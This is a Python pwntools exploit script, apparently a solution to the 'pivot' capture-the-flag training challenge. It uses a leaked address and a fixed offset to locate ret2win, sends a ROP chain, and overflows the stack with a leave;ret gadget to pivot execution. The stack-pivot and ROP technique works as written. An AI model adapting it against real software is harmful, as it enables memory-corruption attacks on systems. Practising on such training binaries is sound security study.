#!/usr/bin/env python3

import argparse
from pwn import *

argp = argparse.ArgumentParser(description="pwnlib based ROP exploit")
argp.add_argument("-q", "--quiet", action="store_true", help="no pwnlib logging - overrides -l")
argp.add_argument("-g", "--gdb", action="store_true", help="attach process to gdb")
argp.add_argument("-l", "--loglevel", action="store", default="info", help="set pwnlib loglevel")

args = argp.parse_args()

if args.quiet:
    context.log_level = "critical"
else:
    context.log_level = args.loglevel

elf = ELF("./pivot")
proc = process("./pivot")

if args.gdb:
    gdb = gdb.attach(proc)

# measurements from one example:
# pivot: 0x7f5da0594f08
# ret2win: 0x7f5da07a0a81
# ret2win - pivot: 0x20bb79 <- this difference is always constant, so we can compute ret2win's address from our leaked pivot address.

# gadgets etc.
leave = p64(0x4008ef) # leave; ret  

# exploit
# get pivot address & calculate ret2win's
proc.recvuntil(b"a place to pivot: ")

pivot = int(proc.recvline(), 16)-8
log.info("pivot: " + hex(pivot))

ret2win = pivot + 0x20bb79
log.info("ret2win: " + hex(ret2win))

# theoretically I could just use my stack smash to jump to ret2win but this is cooler B) 
ropchain = p64(ret2win)

print(str(proc.recvuntil(b"land there\n> "), "utf8"))
log.info("sending ropchain")
proc.send(ropchain)

stack_smash = b">:3 "*8 # padding until just before rbp is overwritten - also, stack smashes must be cute from now on.
stack_smash += p64(pivot)
stack_smash += leave

print(str(proc.recvuntil(b"stack smash\n> "), "utf8"))
log.info("sending stack smash")
proc.sendline(stack_smash)

print(str(proc.recvall(), "utf8"))
